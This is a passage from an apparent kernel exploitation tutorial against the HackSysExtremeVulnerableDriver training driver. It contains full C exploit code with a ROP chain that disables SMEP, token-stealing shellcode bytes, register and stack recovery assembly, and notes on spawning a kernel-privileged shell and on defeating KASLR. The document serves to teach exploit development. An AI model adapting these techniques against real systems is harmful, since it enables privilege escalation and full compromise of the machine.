+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>inBufferSize <span style="color:#f92672">=</span> BUFFER_SIZE <span style="color:#f92672">+</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> POINTER_SIZE) <span style="color:#f92672">+</span> CHAIN_SIZE;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>returnAddrIndex <span style="color:#f92672">=</span> ((BUFFER_SIZE <span style="color:#f92672">+</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> POINTER_SIZE) <span style="color:#f92672">+</span> POINTER_SIZE) <span style="color:#f92672">/</span> POINTER_SIZE) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>lpInBuffer[returnAddrIndex<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> POP_RCX <span style="color:#f92672">+</span> kernelBase;
+</span></span><span style="display:flex;"><span>lpInBuffer[returnAddrIndex<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> CR4_SMEP_DISABLED;
+</span></span><span style="display:flex;"><span>lpInBuffer[returnAddrIndex<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> MOV_CR4_RCX <span style="color:#f92672">+</span> kernelBase;
+</span></span><span style="display:flex;"><span>lpInBuffer[returnAddrIndex<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (UINT64)lpShellcode;
+</span></span></code></pre></div><p>The exploit code is now the following .</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable IOCTL
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define HEVD_IOCTL_BUFFER_OVERFLOW \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    CTL_CODE( 0x22, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS )
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Sizes for overflow
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define BUFFER_SIZE 2048
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define POINTER_SIZE 8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// SMEP Constants
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define SMEP_BIT 20
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CR4_ORIG_VALUE 0x00000000001406f8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CR4_SMEP_DISABLED (CR4_ORIG_VALUE &amp; ~(1 &lt;&lt; SMEP_BIT))
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// ROP Gadgets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Windows 8.1 Kernel Version 9600 MP (1 procs) Free x64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define POP_RCX     0x000378df6      </span><span style="color:#75715e">// : pop rcx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define MOV_CR4_RCX 0x00008655a      </span><span style="color:#75715e">// : mov cr4, rcx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Chain is 2 gadgets + 1 value to store in rcx + address of shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define CHAIN_SIZE 4 * POINTER_SIZE  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CHAR TokenStealingPayloadWin8[] <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xB8</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xC3</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x2D</span>, <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0xE0</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0xF9</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0xE6</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0xF0</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xBC</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x49</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xEE</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0xD0</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xF7</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x7F</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0xC4</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xC3</span>
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">TriggerExploit</span>(HANDLE hDevice);
+</span></span><span style="display:flex;"><span>UINT64 <span style="color:#a6e22e">GetKernelBaseAddress</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">main</span>() 
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    HANDLE hDevice;
+</span></span><span style="display:flex;"><span>    PCWSTR lpDeviceName <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hDevice <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileW</span>(
+</span></span><span style="display:flex;"><span>        lpDeviceName,
+</span></span><span style="display:flex;"><span>        GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE,
+</span></span><span style="display:flex;"><span>        FILE_SHARE_WRITE,
+</span></span><span style="display:flex;"><span>        NULL,
+</span></span><span style="display:flex;"><span>        OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>        FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>        NULL
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hDevice <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to open handle to driver: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    } 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Device opened successfully!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">TriggerExploit</span>(hDevice)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Exploit failed: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Cleaning up and closing handle...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hDevice);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">TriggerExploit</span>(HANDLE hDevice) 
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    UINT64 <span style="color:#f92672">*</span>lpInBuffer;
+</span></span><span style="display:flex;"><span>    LPVOID  lpShellcode;
+</span></span><span style="display:flex;"><span>    UINT64  kernelBase <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfffff8029ac8d000</span>;
+</span></span><span style="display:flex;"><span>    SIZE_T  inBufferSize;
+</span></span><span style="display:flex;"><span>    SIZE_T  returnAddrIndex;
+</span></span><span style="display:flex;"><span>    DWORD   bytesReturned;
+</span></span><span style="display:flex;"><span>    SIZE_T  shellcodeSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(TokenStealingPayloadWin8);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate space for the shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Allocating executable memory for shellcode</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(lpShellcode <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL, shellcodeSize, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate memory for shellcode: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Copy shellcode into executable user space memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">RtlCopyMemory</span>(lpShellcode, TokenStealingPayloadWin8, shellcodeSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Shellcode copied into executable memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate a buffer of the correct size for the overflow.  Need to overflow 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// the buffer, three callee saved registers, and enough space for the ROP chain.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    inBufferSize <span style="color:#f92672">=</span> BUFFER_SIZE <span style="color:#f92672">+</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> POINTER_SIZE) <span style="color:#f92672">+</span> CHAIN_SIZE;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Alocate the user buffer to be sent to the driver
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(lpInBuffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, inBufferSize))) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate memory for buffer: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Created buffer of size: %zu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, inBufferSize);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Set buffer to be full of &#39;A&#39;s
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">RtlFillMemory</span>(lpInBuffer, inBufferSize, <span style="color:#e6db74">&#39;A&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Create the ROP Chain
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    returnAddrIndex <span style="color:#f92672">=</span> ((BUFFER_SIZE <span style="color:#f92672">+</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> POINTER_SIZE) <span style="color:#f92672">+</span> POINTER_SIZE) <span style="color:#f92672">/</span> POINTER_SIZE) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    lpInBuffer[returnAddrIndex<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> POP_RCX <span style="color:#f92672">+</span> kernelBase;
+</span></span><span style="display:flex;"><span>    lpInBuffer[returnAddrIndex<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> CR4_SMEP_DISABLED;
+</span></span><span style="display:flex;"><span>    lpInBuffer[returnAddrIndex<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> MOV_CR4_RCX <span style="color:#f92672">+</span> kernelBase;
+</span></span><span style="display:flex;"><span>    lpInBuffer[returnAddrIndex<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (UINT64)lpShellcode;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Sending buffer with IOCTL: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, HEVD_IOCTL_BUFFER_OVERFLOW);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    BOOL result <span style="color:#f92672">=</span> <span style="color:#a6e22e">DeviceIoControl</span>(
+</span></span><span style="display:flex;"><span>        hDevice,
+</span></span><span style="display:flex;"><span>        HEVD_IOCTL_BUFFER_OVERFLOW,
+</span></span><span style="display:flex;"><span>        lpInBuffer,
+</span></span><span style="display:flex;"><span>        inBufferSize,
+</span></span><span style="display:flex;"><span>        NULL,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>bytesReturned,
+</span></span><span style="display:flex;"><span>        NULL
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>result) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to send IOCTL to HEVD Driver: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] IOCTL sent successfully to HEVD driver!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing input buffer...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpInBuffer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If you run the code now, you&rsquo;ll watch it go through the ROP chain, flip the correct bit in <code>cr4</code>, then step into the shellcode without throwing an error.</p>
+<h2 id="cleanup">Cleanup</h2>
+<p>There are two things we have to do to resume execution from this point.</p>
+<p>First, let&rsquo;s restore the three callee saved registers, <code>r12</code>, <code>r14</code>, and <code>r15</code>.</p>
+<p>Set a breakpoint where the vulnerable function starts, and take a look at their values before they are pushed to the stack.</p>
+<p><img src="./images/17_pre_run_callee_saved_regs.png" alt="Pre run callee saved regs"></p>
+<p><code>r12</code> is <code>0</code>, which is easy, we&rsquo;ll just set that in the shellcode.  But <code>r14</code> and <code>r15</code> appear to be heap pointers.  How can we restore those dynamically?  We can&rsquo;t just set them statically, they&rsquo;ll be different each time because of KASLR.</p>
+<p>Set another breakpoint at the end of our shellcode, and let&rsquo;s see what values we have to work with at the time we begin execution.</p>
+<p><img src="./images/18_post_run_regs.png" alt="Post run regs"></p>
+<p>It looks like <code>rbp</code> is close in value to what <code>r14</code> is supposed to be.  In fact, if we check the offsets in Python:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># rbp - r14</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> hex(<span style="color:#ae81ff">0xFFFFE001F0E0CEE0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xFFFFE001F0E0CFB0</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;-0xd0&#39;</span>
+</span></span></code></pre></div><p>Then verify across a couple of runs, we can see this offset doesn&rsquo;t change.  This means we can use <code>rbp</code> to recover <code>r14</code> in the shellcode.</p>
+<blockquote>
+<p>If you do a bit more rev work, you&rsquo;ll actually see that at this point <code>rbp</code> is pointing to the IRP and <code>r14</code> is pointing to the current <code>IO_STACK_LOCATION</code>.  Since the two are always stored together in the heap and have a known offset between them, restoring <code>r14</code> from <code>rbp</code> is safe.</p>
+</blockquote>
+<p>If we try the same trick with <code>r15</code> though, we&rsquo;ll see the offset always changes.  This means <code>rbp</code> and <code>r15</code> are part of different heap objects, and we can&rsquo;t rely on them always being the same distance apart.</p>
+<p>So what&rsquo;s in <code>r15</code>?  Looking through all the source in our driver, it looks like <code>r15</code> is never used.  This means it was set somewhere in the kernel before the driver was called.</p>
+<p>Before we go reversing <code>ntoskrnl.exe</code>, let&rsquo;s set a breakpoint at the start of the <code>IrpDeviceIoctlHandler</code> function, which is the first place our driver code will be executed when the IOCTL is sent to it.</p>
+<p><img src="./images/20_device_ioctl_handler.png" alt="Device IOCTL handler"></p>
+<p>And take a look at the heap memory pointed to by <code>r15</code>.</p>
+<p><img src="./images/21_memory_at_r15.png" alt="Memory at r15"></p>
+<p>Odds are good that we are looking at some kind of struct, as the second 8 bytes appear to be a pointer to another heap address.</p>
+<p>Now let&rsquo;s look at the values stored in the registers.</p>
+<p><img src="./images/22_registers_r15.png" alt="Registers r15"></p>
+<p>The sharp eyed among you will see that the value in <code>rcx</code> is the same as the pointer in the 8th-16th bytes of the struct pointed to by <code>r15</code>.  Going by the disassembly, we know the value currently in <code>rcx</code> is a pointer to the <code>DEVICE_OBJECT</code> of our driver!</p>
+<p>So what type of struct associated with the driver has a pointer to the <code>DEVICE_OBJECT</code> in its 8th-16th bytes?  Actually the <code>DRIVER_OBJECT</code> and the <code>FILE_OBJECT</code> both do.</p>
+<p>In this case however, it is the <code>FILE_OBJECT</code>.  We can confirm this by inspecting the <code>IO_STACK_LOCATION</code> and checking which of the structs corresponds to the value found in <code>r15</code>.</p>
+<p><img src="./images/23_file_object.png" alt="File Object"></p>
+<p>So how do we get the <code>FILE_OBJECT</code> pointer back in <code>r15</code>?</p>
+<p>Fortunately, we just got a pointer to the current <code>IO_STACK_LOCATION</code> back into <code>r14</code>.  The <code>IO_STACK_LOCATION</code> struct contains a pointer to the <code>FILE_OBJECT</code> at <code>IO_STACK_LOCATION + 0x30</code>, as can be seen in the screenshot above.</p>
+<p>Now that we have all of that figured out, let&rsquo;s add the following to the kernel recovery stub to reset the registers we clobbered earlier:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; Kernel cleanup 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r12</span>, <span style="color:#ae81ff">0</span>                          <span style="color:#75715e">; r12 is 0 before it is clobbered
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r14</span>, <span style="color:#66d9ef">rbp</span>                        <span style="color:#75715e">; Copy *IRP to r14
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">add</span> <span style="color:#66d9ef">r14</span>, <span style="color:#ae81ff">0xd0</span>                       <span style="color:#75715e">; Put pointer to IO_STACK_LOCATION into r14
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r15</span>, <span style="color:#66d9ef">r14</span>                        <span style="color:#75715e">; Get pointer to IO_STACK_LOCATION
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r15</span>, [<span style="color:#66d9ef">r15</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x30</span>]               <span style="color:#75715e">; Get pointer to FILE_OBJECT of driver
+</span></span></span></code></pre></div><p>Next, we have to fix the stack.  Because of the gadgets we have written, our shellcode currently returns into the middle of the previous function&rsquo;s stack frame, which will inevitibly crash.</p>
+<p>We have written 4 pointers as part of the ROP chain, one of which is in the current function&rsquo;s return address.  This means there are 3 pointers for <code>0x18</code> bytes of space in the old function&rsquo;s stack frame.</p>
+<p><img src="./images/19_old_func_stack_frame.png" alt="Old Function&rsquo;s Stack Frame"></p>
+<p>However, we already know from the disassembly that the only thing the previous function does after calling the vulnerable function is clean up it&rsquo;s stack frame and return.</p>
+<p><img src="./images/16_prev_func_assembly.png" alt="prev function"></p>
+<p>If we add <code>0x10</code> (<code>0x28 - 0x18</code>) bytes to <code>rsp</code> at the end of our shellcode, we should end up back at the previous function&rsquo;s correct return address, and be able to resume execution in the kernel normally.</p>
+<p>Now let&rsquo;s add this to the kernel recovery stub:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">add</span> <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">0x10</span>                       <span style="color:#75715e">; Fix stack from ROP chain
+</span></span></span></code></pre></div><p>And run again.  This time, you should see it go through with no crashes!  If you add <code>system(&quot;cmd&quot;)</code> somewhere after the exploit triggers, you&rsquo;ll see a shell spawn with kernel privileges.</p>
+<h2 id="defeating-kaslr">Defeating KASLR</h2>
+<p>So far we&rsquo;ve been circumventing the fact that the kernel&rsquo;s base address changes on each run of the program by running off of a snapshot.  That said, we want our exploit to run on more than just our snapshot, so it&rsquo;s not something we can leave hardcoded in.</p>
+<p>Those coming from userland pwn are probably concerned right now.  Finding a leak to bypass ASLR is one of the more difficult tasks in userland exploit development, and can take nearly as much time as finding the initial memory corruption bug.</p>
+<p>Luckily for us, finding kernel base address when you have user level code execution in Windows is not hard.  Microsoft doesn&rsquo;t necessarily provide a function to retrieve it, but its also not information they try hard to protect.</p>
+<p>There are any number of ways to do this, but most of them involve using undocumented Windows functions.  I always try to use documented functions when possible for stability, so we&rsquo;ll use a known method of obtaining the kernel base through the <code>EnumDeviceDrivers</code> function.</p>
+<blockquote>
+<p>Microsoft classifies all Windows functions into &ldquo;documented&rdquo; and &ldquo;undocumented&rdquo; categories.  If a function is &ldquo;documented&rdquo;, it means it is stable and won&rsquo;t ever change.  If a function is &ldquo;undocumented&rdquo; it just means it may be changed in the future.</p>
+</blockquote>
+<p>Here is the <code>EnumDeviceDrivers</code> kernel base address resolution code.  I&rsquo;ve commented where appropriate, but if should be fairly self explanatory.</p>
